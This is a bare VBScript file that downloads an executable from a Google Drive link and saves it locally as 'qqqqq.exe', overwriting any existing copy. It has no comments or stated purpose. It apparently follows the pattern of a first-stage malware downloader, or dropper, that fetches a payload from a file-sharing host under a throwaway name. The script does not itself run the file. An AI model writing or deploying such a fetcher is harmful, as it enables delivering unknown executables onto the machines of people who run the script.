url = "https://drive.google.com/uc?id=1GOiIqNWf51mpx0Xuv_kZF6dkweK8EVS_&export=download"
outputFile = "qqqqq.exe"

Set objHTTP = CreateObject("MSXML2.XMLHTTP")
objHTTP.Open "GET", url, False
objHTTP.Send

If objHTTP.ReadyState = 4 Then
  Set objADOStream = CreateObject("ADODB.Stream")
  objADOStream.Open
  objADOStream.Type = 1 'adTypeBinary

  objADOStream.Write objHTTP.ResponseBody
  objADOStream.Position = 0

  Set objFSO = Createobject("Scripting.FileSystemObject")
  If objFSO.Fileexists(outputFile) Then objFSO.DeleteFile outputFile
  Set objFSO = Nothing

  objADOStream.SaveToFile outputFile
  objADOStream.Close
  Set objADOStream = Nothing
End If

Set objHTTP = Nothing